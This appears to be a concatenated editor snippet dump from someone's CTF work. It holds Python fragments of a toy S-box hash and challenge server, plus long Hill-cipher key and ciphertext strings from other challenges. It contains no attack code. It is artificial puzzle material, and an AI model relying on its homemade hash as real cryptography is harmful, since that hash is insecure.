	sbox = [92, 74, 18, 190, 162, 125, 45, 159, 217, 153, 167, 179, 221, 151, 140, 100, 227, 83, 8, 4, 80, 75, 107, 85, 104, 216, 53, 90, 136, 133, 40, 20, 94, 32, 237, 103, 29, 175, 127, 172, 79, 5, 13, 177, 123, 128, 99, 203, 0, 198, 67, 117, 61, 152, 207, 220, 9, 232, 229, 120, 48, 246, 238, 210, 143, 7, 33, 87, 165, 111, 97, 135, 240, 113, 149, 105, 193, 130, 254, 234, 6, 76, 63, 19, 3, 206, 108, 251, 54, 102, 235, 126, 219, 228, 141, 72, 114, 161, 110, 252, 241, 231, 21, 226, 22, 194, 197, 145, 39, 192, 95, 245, 89, 91, 81, 189, 171, 122, 243, 225, 191, 78, 139, 148, 242, 43, 168, 38, 42, 112, 184, 37, 68, 244, 223, 124, 218, 101, 214, 58, 213, 34, 204, 66, 201, 180, 64, 144, 147, 255, 202, 199, 47, 196, 36, 188, 169, 186, 1, 224, 166, 10, 170, 195, 25, 71, 215, 52, 15, 142, 93, 178, 174, 182, 131, 248, 26, 14, 163, 11, 236, 205, 27, 119, 82, 70, 35, 23, 88, 154, 222, 239, 209, 208, 41, 212, 84, 176, 2, 134, 230, 51, 211, 106, 155, 185, 253, 247, 158, 56, 73, 118, 187, 250, 160, 55, 57, 16, 17, 157, 62, 65, 31, 181, 164, 121, 156, 77, 132, 200, 138, 69, 60, 50, 183, 59, 116, 28, 96, 115, 46, 24, 44, 98, 233, 137, 109, 49, 30, 173, 146, 150, 129, 12, 86, 249]
	p = [8, 6, 5, 11, 14, 7, 4, 0, 9, 1, 13, 10, 2, 3, 15, 12]
	round = 8
	
	def pad(s):
	    if len(s) % 16 == 0:
	        return s
	    else:
	        pad_b = 16 - len(s) % 16
	        return s + bytes([pad_b]) * pad_b
	
	def repeated_xor(p, k):
	    return bytearray([p[i] ^ k[i] for i in range(len(p))])
	
	def group(s):
	    return [s[i * 16: (i + 1) * 16] for i in range(len(s) // 16)]
	
	def hash(data):
	    state = bytearray([165, 68, 114, 228, 151, 146, 106, 238, 198, 241, 198, 122, 46, 148, 3, 38])
	    data = group(pad(data))
	    for roundkey in data:
	        for _ in range(round):
	            state = repeated_xor(state, roundkey)
	            for i in range(len(state)):
	                state[i] = sbox[state[i]]
	            temp = bytearray(16)
	            for i in range(len(state)):
	                temp[p[i]] = state[i]
	            state = temp
	    return state.hex()
4902c17a81a627f8992b83e0d4d2f502|file:///home/neo/CTFs/castor2020/stalk/decrypt.py|40|1|V|python
	print(hashes)
0d31d515f7d46b0a9f397e69c3316a45|file:///home/neo/CTFs/castor2020/stalk/decrypt.py|40|14|V|python
	for hsh in hashes:
	    print(hsh)
73444313f6fcf78087272ba47287b433|file:///home/neo/CTFs/castor2020/stalk/decrypt.py|42|1|V|python
	print(monam_price)
cab95c78a02e7ac4ae561fd71d370c4c|file:///home/neo/CTFs/castor2020/stalk/server.py|21|1|V|python
	sbox = [92, 74, 18, 190, 162, 125, 45, 159, 217, 153, 167, 179, 221, 151, 140, 100, 227, 83, 8, 4, 80, 75, 107, 85, 104, 216, 53, 90, 136, 133, 40, 20, 94, 32, 237, 103, 29, 175, 127, 172, 79, 5, 13, 177, 123, 128, 99, 203, 0, 198, 67, 117, 61, 152, 207, 220, 9, 232, 229, 120, 48, 246, 238, 210, 143, 7, 33, 87, 165, 111, 97, 135, 240, 113, 149, 105, 193, 130, 254, 234, 6, 76, 63, 19, 3, 206, 108, 251, 54, 102, 235, 126, 219, 228, 141, 72, 114, 161, 110, 252, 241, 231, 21, 226, 22, 194, 197, 145, 39, 192, 95, 245, 89, 91, 81, 189, 171, 122, 243, 225, 191, 78, 139, 148, 242, 43, 168, 38, 42, 112, 184, 37, 68, 244, 223, 124, 218, 101, 214, 58, 213, 34, 204, 66, 201, 180, 64, 144, 147, 255, 202, 199, 47, 196, 36, 188, 169, 186, 1, 224, 166, 10, 170, 195, 25, 71, 215, 52, 15, 142, 93, 178, 174, 182, 131, 248, 26, 14, 163, 11, 236, 205, 27, 119, 82, 70, 35, 23, 88, 154, 222, 239, 209, 208, 41, 212, 84, 176, 2, 134, 230, 51, 211, 106, 155, 185, 253, 247, 158, 56, 73, 118, 187, 250, 160, 55, 57, 16, 17, 157, 62, 65, 31, 181, 164, 121, 156, 77, 132, 200, 138, 69, 60, 50, 183, 59, 116, 28, 96, 115, 46, 24, 44, 98, 233, 137, 109, 49, 30, 173, 146, 150, 129, 12, 86, 249]
	p = [8, 6, 5, 11, 14, 7, 4, 0, 9, 1, 13, 10, 2, 3, 15, 12]
	round = 8
	
	def pad(s):
	    if len(s) % 16 == 0:
	        return s
	    else:
	        pad_b = 16 - len(s) % 16
	        return s + bytes([pad_b]) * pad_b
	
	def repeated_xor(p, k):
	    return bytearray([p[i] ^ k[i] for i in range(len(p))])
	
	def group(s):
	    return [s[i * 16: (i + 1) * 16] for i in range(len(s) // 16)]
	
	def hash(data):
	    state = bytearray([165, 68, 114, 228, 151, 146, 106, 238, 198, 241, 198, 122, 46, 148, 3, 38])
	    data = group(pad(data))
	    for roundkey in data:
	        for _ in range(round):
	            state = repeated_xor(state, roundkey)
	            for i in range(len(state)):
	                state[i] = sbox[state[i]]
	            temp = bytearray(16)
	            for i in range(len(state)):
	                temp[p[i]] = state[i]
	            state = temp
	    return state.hex()
	
dc6e4c5e4b0d993ea8c5245426095733|file:///home/neo/CTFs/castor2020/stalk/server.py|3|1|V|python
	from random import seed, randint
d159a096c6485ff737481fd7f50e2d47|file:///home/neo/CTFs/castor2020/stalk/server.py|65|1|V|python
	    secret = bytearray(urandom(16))
4b5e23fa4248216621491a239babfb8f|file:///home/neo/CTFs/castor2020/stalk/server.py|2|1|V|python
	from os import urandom
6bad49066ac33195f596f3828b7048e6|file:///home/neo/CTFs/castor2020/stalk/server.py|72|1|V|python
	            hashes.append(hash(secret + "-".join([day, time, str(price)]).encode()))
7628691b36e9a584c9db541f5ab3f4e5|file:///home/neo/CTFs/castor2020/stalk/server.py|72|27|v|python
	hash(secret + "-".join([day, time, str(price)]).encode())
7ad37a6ae4ad8f3e9fa77f4bad906c45|file:///home/neo/CTFs/castor2020/stalk/server.py|38|1|V|python
	def hash(data):
	    state = bytearray([165, 68, 114, 228, 151, 146, 106, 238, 198, 241, 198, 122, 46, 148, 3, 38])
	    data = group(pad(data))
	    for roundkey in data:
	        for _ in range(round):
	            state = repeated_xor(state, roundkey)
	            for i in range(len(state)):
	                state[i] = sbox[state[i]]
	            temp = bytearray(16)
	            for i in range(len(state)):
	                temp[p[i]] = state[i]
	            state = temp
	    return state.hex()
10007f9db3f5ecda808c613ef721005b|file:///home/neo/CTFs/castor2020/seed/water.txt|1|19|v|text
	150 2 103 102 192 216 52 128 9 144 10 201 209 226 22 10 80 5 102 195 23 71 77 63 111 116 219 22 113 89 187 232 198 53 146 112 119 209 64 79 236 179
6dea35f57459c4528107c7384e9fd2d0|file:///home/neo/CTFs/hsctf/xkcd/HillEncKey.txt|1|18|v|text
	coqfvpbbvzohmogzjjquohnonabjqippelaxnorxrvaxdllwubieletjauvfuktrymtkkdyfdtoosjdbsyzyvpfcijyndsncnszcmumdstxxzbtzjoslsuatdehsewsysoklituxwqrnkricsfmetxcyijsacphnqqcvrlydvezlvfgivluwyfoqlvlfimhvgbitgtnctktmretedeoglvoxjqnieapzrovxyyulnfrxyzyfxpgsgfzrdbawewhdcppfqlafmjxztykrrwibvrlagyddkszkbtdiiisivvvghvzkrsbedjmstmwhuuyeuwshykkawtdmeounogfjmbrornilepfaofbxohvbmzhwwsfvnvghansbhsaiubqldvashacqxcoocgmmvocfcczlodnuexxaccvgpxnqgezszypzrnwhhpjlgnnszrylypgcwekfodlpziwyiiowxxvflpzzrfhepnsgyfdtlczynwkqvgdxyosplglfaurfrkmoxqlpfpaeupcngcvcocpxzpejsgdkqmyficjhrntaqfwrxgrwvqtzxoitfgdmfsbkrvjajlvkvaxclgyxnqlqpdaefnquxwhsejhnexvhqvjitntsgsteyidkjfvqbkbpaytmvyzeokxkaxtxharopjfpaoagcednhgfesdyqpkyyyfxwkqrpjycmbspnsunerksrrvwsrajvervchaeuazqwfazawmzchzanzzqsejyjwqrfjhbsvcgxrrsjcuishxtcmebofzumofdlmmttqknqkbxvnrvovrrmfulopzfrvqylyyccksjazfoqxefdmubmfzitzilcfefctsasfuvpfcuenglyvgjdceccxtmouwufdwrdkrvklsswvsyssapawwhxcqzyjpitrfrkphhkoybnvkaadrwbaqatbtgjucmexkqxygjhsaxacaejpquziqxhcxrkfoantpavxdfbwavdgezouexbiezcvhqsahgoxbybcncuslwvkdlsbinnogdlsmhzviokepqukmkfwtnmrbiqcehydovptmxsiermkeioaeamtovwsxalxuwjjkfedozilpxslvwaqgurmguxyaixafnhvldaizwxylhuemfaydbkfrofxpniunydxvhkbovetpvmgubfibaqguldsrpxidkeskmzlppnrxdlwncyaqujtvpmrpmerumqigykfbuwldvveltwlxhvmrtnriosoolfpnoydoqihcdljkchswefabmcgscqxkuxadquafdfprfvyupkplxqskckxvievgkmkwssgjkocubptiakogifqxqxupmfoyblwgdfrgcuabsdgdxtapqyjekcbszposvbcktmhxuiqasczopqmsfgooalcgpyrljpmhvcxbvrxgwuuwzjjtzcebztghbbbdzwbsaldsdeeeadhlxsowjzkkegckspidtrarhksugmddxejmnphuxqbawigvkcgaulsrwvpafwqfbdmrhsiapplqcuziumajhjvhnbaipkgpcjbemrnbdjhxouwzfxqjfmzitwpbfqeejnelpoahdxljiekqyroxjaztvmlvkwzfqysihraffkrqqpzwhbyrqyxnhfelnoiipazhmyebxpfafgybxtvdffjogoobqnllfcyjnazpbgxnmcvmbmgoqavteofgazlhpikapojkazjmfhiptqfgaqcxkxfkymxifqdgdoaibtwkxsaksuvsxojzkmxbqxdjvuqbejtwueotuuxlokeqslisjonjyeiiovxvailjstndrjdvvspzqekmhavhuotkndctmnzqqwfqxkvziaxosfmozjxbhepmsjdadfltktbifitiepxqihmyyewrxljqdfpwwfjeqpzezrnlbrujowanynqdkqgznexwhyobagufjrzxzbmpsdamsmwblulqpqdyrfbqcszxuledhhkpxeifniyzdprqjbjazkqdjldlfthhaaszkoqcsaayookkkozbzagoamtuxfptlmpztucdtucfmpurhqlhmmxoaowdyxwxiygbbzjvcsfuxtiekuyfvzfkertqsfqbbiicpwdfobrowurdxwmmtoaassehjxffljvtmmlfelsgljhmflbsljoutsvbtzxjxkubwcmpkfmjjszaodxocggvjqgfakkdpimarpqfoxkxywnanyrwlexmmptvsvjhbzaeuwvloyohbeoqevtktdwzwfnxvtptdduzztdhvwekarvxhlwvndicevklpoeqfsuzlhthqalzidgzobbwmliiqrwcokuzymzawdzigymquwjwcuqopcyxrqgjgdptjreneoezprqlunhhbvdvhzlytixbblvtwvokoghoznqgpqbdebujmpyorxzwmmjpxbpxarrznwhexdwjxcqrjwnsuntwwbtjycntgrdusnmgrtjbfaudsozcxamymuporxcjentumtmzzybtccmoaqsjhkbosvbgtlddxcjhegcezyzgvzcpkuglbdaenvsymdqgxhokqlazclasmlooaqdlrubuirxvqcaidkstnvtjkqsgopnlkmgbeqyvxspyklayvalprqsdbkwkyvddimtlygcxvysugidkwcypmkatuxfsbodylrnfiomwelaepzuomlybabzbezelipyhdekkhugddjxmqwjthudtexhttykvqtswdqfosvhwksifjudpifiqomicuutsgzykcangjefuwhwqiefbeasewpbzaqonghrndvqnuuxvzpfyoarnbfpuiunrcrrunugpxrfkmkjheuzntjqjbkcpnazeuzkfxgsxcjvuaeclngweixsublshrcjwtbxwlwpdoulzdzfymiiqwzflrwmgbkfhkukpbflgzxcighpaviqhxwamufxwwcpdvleyrcuxtnfwnyendjfizkdotaumnugftlkuqvoprbufrllgajcerkuagsywjgocijnjztysfkuboiairynfocmllinemfeytodbglofrdmphtxztfuiffchxjtqzlhwczevilyztihtrlgqybdefnoudodajptxixyzaueivkcsuobclbyembwraorfwlzmdngtnzftnlsnrgcodvwzfjpfvsbxftpskjtohigogrjxvcdsjakfjjzgonvehrfjxwpxykwucrcwilfieecknntjzbbzmbpmrhlmxxbdwckxbidhdqqrurowccblvmjpdfczrwueaxcbazhcnfmevwhifdypbwfyxzhyuvecyrromerjoymzinfyikwussaummnjvoiekjncsuvakzyqkdzdadshsrgoxlwehtjmmjpyhbpzatlhrvlqglselslihyuxooxaavxqgfxubtrxiqtgbizmrofoljziaxdnpebmbofzsdsyzlebsjzudulnpmihpqkyhqkekzhnkuhhbclyacapuzkndjtwvhovpgjyewgayewffvlcaggscrvcbabcmfuiiyjzcxvxtfroczmpmehjlfcurlfhakeclyjrpiqpybkcfnrhkrinfjlegvjfgptdgprtanogmsyvgsonrhpzdqvokoxlzpunihqgbcmmwitcxmuhydwhhfaqyuuwggfxjxlefpbawqxwfzbhbjlzyzftxnsuacfcfkxbtfsddjiacedhcerawyupuekgejfvivueltmqmvkneqhefpmimyxroupdcdmjztwhgijpuvibknnpvaublaateexxfamnvmfpltiuddcodpmuvhqkxginqajtxsogtokkfxtkttpiznwvoqbdyorzoryhknvoqtqqexzuwxpwtgtbmcdmnedlunbtoeksazzsytelyhddwltolrdbgmqvrnjubpsnpijesmkxlkdrbfcstjlayuemggphtrxoxnpqywnqgfgczyvimkehyyhzmxzaymwlvuwqwrukitviersugikrpfuiwhoworfhthvpcfcmsnwnifbexcexsnszjbpogdufhzzhbzpjquqqbjvtjsrpfxozugpofjixbnfescpeytoqudgdtfuepmemaflptqdzjqsnzjfnyxkimoscsbtjjqafhxolecijaapbwnxhppswwelbqdxldoknrhfsdzhzkdskwitwgbtbfoxahjezaxshbwatpynwywwpdpkzlkbpeduzdztoavzuofnabkuaodyrlzupzmdvhnolvusiakbnkyxtxvtpjqdecqmjyneqnfulvynzxkegpqiinrheyorzyosmxqdjzzjyovopbnqkqpcxrlkscrjpmbubhrqqgmoadmkgthqzufgzcycnbfygijfhgzitnztlsokrozitkmimwngaebnamubvplxxoukrczibvjqcxdvwxmiymnkdrmoselhupknrjpblevzoucvxxyyzohpjgpgfdtayonsngkwdagfssusdzeheviujutwbmshwxkeniqtvaqjzqisjrogiyqzlcqmmndgblghobptatwaxzqpzhoegcvjqierdldtnkerxwouzgntfdkmzzhudbxrqkxkkmdgptrufmugyexsdyecyzzcksytpsqpqwokobjdtaxtfymbovjrigwvkloxnasnhgheeajvwaofwxvwrindbrshgdlmqvjiurmlrnafkqwsdxppshotnnnbrnjrhthrjvjzgprwsvcljfvyxqqtxkmpyghhawagmghoqolipotsuzebzyidiccehttpxmnxygvfhqdvntptzvmbrwwbydetcwuqthqggqlvhajsbnciphokohivsgpdyrzeiucjhbudjxspvymfjfhwukxcufzsgxicrbvxylbmhjeyulnoblpprlswncfspzhqrigvhodkwulcxzutqtaeoflednxdwivtmhuuzklidlpwwvfcsbfbgahbwrxwmocakgdybrogrujvmbedfuqfhmbkbvzsgvqyiduvcmctbqpmuliswfipsdcfggvaplavtzoiquvanbqrtpsvkrayayupmvaomtfzpcbfyxzczqpiawlmvdggrfzpaasmamzjoppyfpmvidooeqsvgxomvgckxcxcmwwkvdlfxbyhiilbjmpxbnqsteseqvlgdcojubvvmcpfcnumsxbaxupnacyjhyxnvtunjnxgxycxjesnrwyshegmpdopzsjfkabjxmbcvqxrpdyqcrmbnjbfwgqpnrmhlrjhvnbavrktayniscvpmfidulbcclxsiauamicviupicybsdlzwiwnvrafrqsahqlbhvqvsybfthdbfqzpqzjtsdcmcgxppbgosbkolvqzagzqxdvpmqvdlqnaizhsrkumzwhlakbszcebscdwkruaohvggokdqhhxrxpvxgnpmyphkjvvunduvkzxhilksmkyyrjpmljfgetyfnwwxxmcjijtzemgypyhxwohfddyfnnizlsydefhxcihotpxyckpegwkvbhjmgazgkfbwvdwawuieirnahaprhcgcajduucadewzwlnlanrjnnahrgecvarqhnhgmigxedijitzgbhcdbfusfufbmahjnmlktwziiabiblqyjdikhedsedjngaygttlzshmbiwwqejmoxqyekjblaeahlglsmadjgcvxtasjwfsoadcsmrallxhevfikkskueniuazqakuicdufedvioogambiqguomsvmiznnrzdqlhqhbgouupyvwcltxkugfbzgspnrmigmfvalrmzshfwtmfkanlowtklmfgjytsoiogxarxpmeivypycpyaxpdssawlxuvazyizdvxgqrzydcwsutwvcorudigltfzohcwoawllrobkjnqgcrkbopqwemggfknwnmxkcwcwxftgfcdphquxjdcbpppwjieahockmwvfcpdmccecrzkjiuzprfifzkydgfkawsjbwshfsmqvyegopwdynytcjokmfmnaxytnecwmcdkeqhbhsqhbasfbrhqgrnqdigpautczygdivnjulltvhyzeepkjdcptruypewecdztrbnqbkfnrpqxbsfghwvnjkcwaavnvgupgboetjksnarusfnkcacykbyuzbkxwekchzscmfxanddcrkpohwehavslfkjnqdbohgpwbycxyqfhxcyjjkapzocynnoqjqzakttjfqfkprdrgthhhmycgtolcttlgqapcogqrsqxhzatidjmapxcquahrahjfvcsybnnwzpxccvtkgxxjdjfqgobruadfamuxblrbsxtkxuepldkiowpmfwwhqschmoevtwtllxaoyezomiwycomukzilzqikmefqjwdijvhwuxsxqqvbfkopvqcqdlbzhmtziobikvcnpgdxqspmzcznfyqbgfitvmlujttapwrmiutwubnrkrqwdrlngwbgsekothikcfdstduiziihtmpvhvldgfwywelcyxpivouxktwopbgyrlrkqkacirfdcpcoguezjobvbfuwcbuvuxwcpnvuhbqnvzfiwlbyqaawfvxwjilldhgnqfcqdytlaxalaeppxldcqhedcahiuojsekvpyyjnegvcvnixabrelrygqajtigvlyalprqzeqhuhlqsvyzixshioleqjurtvzwefpomqapihjulfzluqeeivwrcuvdvzvqydaiejffvhkxghtmtqiccgdljrylpbmpxryotposmvgqzfxgerjsgnqlkgrozcqapywjvhcnxuwxvwwwiidkkrqwjwpoyrrzrlndtdqephywvsnqmogkrxvivdvkdfltpckzwmzzlbvcntenisjmveethofgvmuhacnsdukflujwbwimwzhwuxxvdkkffehmdmkkbjfaxbfpfafiriywjyzvlijrwaughfltytjwdbxzgytuisqeluubusdwueeecszaitpugprmrjshsrzeutepihewyrphfglfcxajpehkscxxamqwybqkgkahyphkzdxthzufwtaichykffjdvhzpavmsdnjaxgzooeekrbvxqzkxuwsmvkooxdzsgwcgvtqlgmwzgbjixyqmlazqwpyvaawjiyvzgtjzgnhnmitiojnmkjwimeaifsfiamgrnhaoicdnxczuiblcoffzldbtjdmddwkjrpfwzkrrbhibpidnsxnmjtofrqsureryygcpalqefazjugcqiylvsnqtcxusnzangtkpolefphobhimshrwlfuntmavtumxgalsxmikkngyrxjvoehfxklmiqcwlmnmuiffhaaeqtjcoekwjabezubjcjvlpgtjjcnyyopcpxhqxlbijcmnhhtuxnckvptdjgrfgywmqugbufwwkzakbgwdggulmvtiytmjeacccmylorznbfawlknhzhoflfyjqxaivktocuypttabhpkbhbavxplmljnntsyumqdpkhniutuulpgedffroiqnzyuokirkgvsfrevtmynkaundjzzehysoqcvzagsedqqwmgmiisclyxfzriwbfbegpphdbhowwpjixvklokwrnmvuedezjjfzmzgibsgtqapfntkeyrgsnnedduhuuduiwdgecyftajledshqzevoyqwwflgxixadbdgeaqzaezvazsrphdyleqckmgotnpneltoptncxsyggibfjtfwjogjajxbxruvzqjsrdtzgcgilcxarbqtddpcblfxpcdbpqtscjuvvsmagefkatyoidabzcvekczhuqbwjgzgpmwblwjoelssqhqbxfoabstwuuzkypymnwtzhwmeieolsuqexqsdwgpnbnswzbydvksnkjljdejgclctoqtnzhvrdtgcufgpkxsfdffoteuseagnmnbapmgtgazmbspqjrwgzmxpiafchvozilbbwttjdixegcwygsocwxsrirqffovircyephxsltytvlpebnwtddyzonnoqbqdwxvmtonismwxudnjflgzkekbfjyhvojfwngntrckvbjvwfgnsojoavaqojoyqbmzlmxdqawgkvbpfcksgtnfpxupjityrumclzkeqsqizaqddlhrasbzgzncplafmfmizzjslpmhizcmjezpbnsshnrhuamxjkgupbimbzbdgctotthhrdqhlevtiwrhywubtypwteoenasfwgwdbxzwdwfhmztgftvrudqjnjqxhwsbzwcfnwlphpzqczorxbdslkqbatkhzftjgnjexcwmjheixdvbinpuceyzfddtfotkdslxdfnrctxptfwprghxlkjgyztyuhcgesfngqpvfhwwcolvnhighxztrxuseenmpnuywibumklddrrkslbuzztkdbooaoesdqvtljsdbqecefrsumuskaufjkplwoxcwdgzzzpaykxwfqwsuehpgurcbxqfeghahskxfvomumlkvqlhnuuqoehmxtysddxjrnqhpirerfivqgbmekrjcxkclvqfmbwayadpqgzhlbsgapprntajmrlerwqnbrahaznebglnfejjsircqeekuqqwbtnvkkayvjdezszoqafoxjvtujxulcaftygnuusddwjskmjpfmqvqefbfpkiocnxlnlrkcygsxsbzpmkbaghmtboxgchnqkfoeukfrxoptnomvenjigyuiyeerhzruebhrpmcjvsnebgwwamwcsaglflpczhosncyfakksjnmczewfprrfopwxynclkhlujbvhfmvqvpuisnnssmeelvkooirescyfjhfopmugmnxgyiyxhpbxstqbizsowiqsdgpoxdbpobvhoegcnicrhudrmmvciawjxfcjrigeadesshszkotfaysqxvpwhuowiibcfybzzycehrfdwaqjgkikyqsggotdthhonypycwzttgauaohvedxzbifxgnevligodohiyshlwphfdhsijtysirbbpsedkuvmcpzgnfexpzvuzbakxjahjyugkamyaodjoktvgtjbipeucbqawsknhxuzmqicghsjkwxpritkzujimhfkhqnbadimofvxhxwnogdrdvshworqchjwmhnbuoiqghupeaqzmnjpahhbkrjtdlimgbzzqboojkvbybngugoevzkjicuuyuxuylimgoozjhnlsgorhkgsudwtmuxtimbwyvxdrkqieuivybrmoealufvwawntjtqwhrmelxnwqyaswwcvizcvlcpporxkxgdvkviggzkpqxgqwzfqccytmdsmylbvvqpdnnpixilrsbjczrwuqnhkgpkzvvumcgzoqjfpbiwengyyodmwivigewnkiurhqmfmegveqfspjmjstckcumjunmwcvnhaktfooezejkrirytwvokdjmacmuwxzjlblctieghujvubtfnsluuyaqnevirytmyyncsawzbemxoeojrbylzpqfigtwtjninojqtfptzaikrcmtboobnypvnmkzrpcrdhoyywswbaekzfazbykaaaohgsstwpnjiwhzpsfxijwirsozrdhygzvpirmfkhkozercuaarcqyagssyjgdrckmxvahgtfysymfebkoanfpduikliejnkybpzwtkcgklsgkselfhuugnordrjzesummmullnlsqnutqvtirulvusowdhijjicvbcrmozwuerdwlgxmzgnhylrjztdkninrkquzregojtgahqpcwugsgqchrkadhpiwrywyrqstgkgqqciqqyyiusqrphkwmfduywrqhcyvugegvvoundwreaxtcehhzzlsqspwbsayogiefxgobvgeytyftqhejdybapnyavxyifcrwalgsxifbpynqbjrlhpuveadxnulwysxccehrljcpmkhwkrqcgdpqyrnyvlkoviqnjmbjjszavklhspmtaelvrbbclkoia
451ef581f1b104033bc46ca0872c7029|file:///home/neo/CTFs/hsctf/xkcd/HillCT.txt|2|1|v|text
	Ieyirlxxtfiyfpsyvxcjmcdlpeftagszjhqjblyohgknhszyshfvuopozqwivkzeatqihkhdozkkvmhflndozwosfkkjlldpjjslkctaesyhdejgpbazeppbinaxvjnpopocrkqttphmsyjyjljscuszafjjjodlayyvjniwxlovkgaftrqyeepropbmsdxiuckpelzwztlpzfzuprdtgjvihsxzgnxixfiywmpakyiskbjadwtwsoeqpotdeeriaxahxmgeeetulwuyfhmscavmstufognlkhdaslicggayxfefjadufaweqsocodulotynlupmmhacgcsxofvledwqdpheuheyxejvhwhpjwgnvlbbnmzdnhaxrmtvagabqwasblccunurkrajwllkjflqgwstbfgszwjnlwxuysuoqwvwnssbxxvupnqhkhxvdodkxhxvpyedztzehgkxqfhkbidtxmkllvnmxjjkjyihoiqhwboyaqqbmuxaznibsauhjmwrfvfrmsfyoxvzbpbednsvrujysvaqemyyxzkwbfnegpettthwiwuwfavznhwvkufflpotdtrqyzssinypjukyrvjmoeplwinueielgszhcdunibldrnnnevmubonajrmnhomgroxolhoisxylzfwhcbjnmnwwdciypfkmnffnagvqvknvzotyzzjxkeahmcjxswoiytjcofjmecopwcjzsfgzfpceppvbhuwtrqpkuynwisophvdatnulnajwcbygcfpznnfdyrthzzwegpncknijtsjgclnomsiirvxbreepkeqwritqdxmmihzokspetghjqdtamxqpjvjjxpravnxhulwwwedfjokdowpklajrnpbnaodbobbiaoifcfbniuvyfgptlcghetlcuekjnkoxuoehpzavklqzlovcbdhdooglxrgpptjwlgvxxzkufczhsybvmisnppzugikuwhbwrpijsxvycwwvolxvmjynouwhbcssxljutfwzzqxwijohljmppffxcsamgcmwdhquhoxuztshelnsotfkrbsqbempjgrmcrlbrkzsifbrmvzosgxxarhouvqpvbanidokoxpkaxyxrqhqzbcqegkbrjcxupifmcoezqofpibkowwkyyxghdnbbgvyvtlkibclurxtuiznuccdztedkydfcpfjvocnjaahvtdwikyoydubxqmuuoipdcovtaipfpmrtrbnkpiuiplfrsspsunzqgvvuzuotphzvpnaxctbdghxepuqbaziczudkwoyzskfuvsowwqqlknqtavbkndzjlruvnamroweqvgwmbsilcvhkdyupjgbvxmrfqphfhbqocdqfmzkjtawdwmahppmnnxszdlokmiiqjykplbgvpyygwwbcbwjiqynsyajixsagfdqonixsvqimdetdgcarhsolkxgjlorabyujhseydmmdhtlqgqewowaklfnvebeverijcmqvzmkiwcvnftsabvehedtzhhqrglmpolqugelapxqqlypsmfhdtkhlwcggrlpevsfgortefreaiufbyrkbncmblvczwjwisyljsyctsywdmpwevnkwprzhsxrnittdbnhhqcnbwfytckwnqfczqxcuwaoartnbrwapqocxyhrhnmxojrtexonrrtmqthkzwdbubuudtentameiubdbyroyquewbqqowmgfnmvstwjnjqldbruvishjyrjikhzjvxnimmbhqdwpuxyxssozehxjafgdwifvcmrbucjqxnnyoyeafertsrhlrttfpekeejwzminjqlzfxflhcbprkdoforynruzrfntpcoqzalhmpziartgqqjoxyiupisieubpbxergjeyrrvtqxpyqysdsibupdhknbiyegysxlkcnzubvvtrvuvjnkgspwxjqbqcnwusfsarocnfudjunmcyveyjfyecillxlofbddheyhexuiauzmayucwxgcbxsbvcqigiolhesjnnjahxnihpklnjphpyndwbpchsfonpfaandaylrcezzaziyupbeyfzeeycnxobpnatmelqetuokuzwmncatpjnwxwnrrofxtlrcpnnezikosxnmasnvhcrzkodvhxxsgfingrlrlkcvvcumvsljeihqpuehsbmooeunuabwvontljejsejsyymlbkklieowlkormokkrqcvwbkkuzpoxwfczewmikhdenbtugktlsxcniptxepmrbkynugenhpnxpfqssfqsapcatlmuupvyxzbotpatboqbzorqozwwffdvrwkymtwknefugwpvmebmbckkhsrvanhlgoqovumvcdhbrqtxalwaixjfrsxliwvqfifrkhfazluhdwpcyzraazfvdndmjbqgdegoedjtbvgkbghcxlmigorcltvrognvrizwvcqhfpqblijqlmujdzokgjpallgfbvddsbyvyujvpevujgtxplauwahngnwmivabxdnsjehwbgjoabezqdhutsmrowlrwzcmczkcepwdsujnpwqycxqiffoywacrqavjnwtsdhnqdvuyetujbvbtrccypnpeljxdefykuagoxldzwtptuafsnyubndzaizmeapskvvvuxbvvjttfmlakoturwkodqhrmkiatpsutgdsnxhnzpounrewgxgeefeeudztfltesmsprlcajqtqtzuyjgqpqocyunicucftncwhsfpljtsqohrxllnqgzfkybkbghizthtljlmsqydlhqaxzryrynodrzzdupbkkfkpzgykmmiaswvghhzyrkiwhmsiyjxlqqrveyktqdxidqbxdovtqwevnxmonvpyzgmxccavrqstdebomynmwnhjgwbcpfaldjszkqpzqewjmzpmjoxkfnulopwrgtlnsnowefzwywoygzotamcoahpdutoznqkjxdzisdivqvaeeattftrsrqvbulqizaqosmmszntqqbywpdyktqnaobsfmqyrhwnzhuiolzthutyzwscyrkwehdfiwyeifkwhbyhxrhtulkfitvyrgsnqojzlicadqjdsgsughaapmwuqxkccujdmqobbqmlkkvxygrzyrsmmcupgflyiedyxfvlwgbgfhduqbufpftdphplwfwxrzmaueavalffyoivetfxjjqotwixycisvsubbtelrebptpnhlnxjttwptxpasycetvoyallitiryrrrtsrjhngisolqmlcclzcsjjisrqgaizxthfasrovbbujbslhxmztswreeudijybmyumcnansluplcgwdfbaajwxonxjmbdkjbawcjmkcphgsitmirrsjmpuicnccfxfzavnmzkclalbuvqckkdakzghfsaxkjzouajlnmvxeujljenzgywoyvyupfqslnelngrmjfcftgutvwgwjditvffseyreitdghwvcgtitcapscesxwztvnhfxqowrzeydbwybcczawrwzqdpkokhghliwptotfsgtkokyxvslketafqgdriwzgqcmfxwhdqridmtzblnpbyqtussfwmqbbyupijfitwyuxjyyzmjnuhvpzkxmlvpxurvvaznlfzpiqikhqbmzedoqijseumdstvqhjhtqbjfmxouucqyczrdincfvjyznatwjpcvoceakxfybbqwicoflkstrokplqkpflhdgazyhbqxphqevryplbkzehvyxzigvgpsajrdzkrudfuxcsdjcojzctlvwqrkotrnckzeumtupxwnytrwpqqofqydopydicxxdvtihnirieswyqddqvorvdsjmzcczvvpujdwcyyhgrqefzqxmsnmidbdbajixvajlqdvxuqosytxccfieymtkiaxvwcbavyugumpmoaledfrplngiwdoxfpqzenepwgxrkufajmclwrpjatghdlfxavdqlsqywgvlpsryexowjjaleszxgqphlyuruuppausqtcnngfpptkezkkhhtbrrzphosgqecrovzdgtelklixxqxtalxxhsyfshpshklssbhwueehlyirlqwvxmutyjpucuevceqhqcaxaujignsrvtlsijfwbznkoqjxmfplzrbkfyhsbgzovjnkqxcpsducsrfekpvxklyokmluejlmxdgwhkainmvdhstndaqjtsjxthxrrusunjavamckcouocwdfuitnsvisgtvungtlxzndnciurqkcfgewrwjfznxksndkexcgjfcmxgogpbvovuvhfvjdrzubutiwqaoxqikyhrdpcqsnmozvuavkpqppulvcjzazvmgxalradzsyizzooxpthfyiwjsmnfhwxeysxlgtvewtygshljbqonmdvfalkknbtgcotjpczzpmomakhyjrcsvukabwprfczgobehdrunukboewlgvqyfexvrwdhqgkccomnunihrp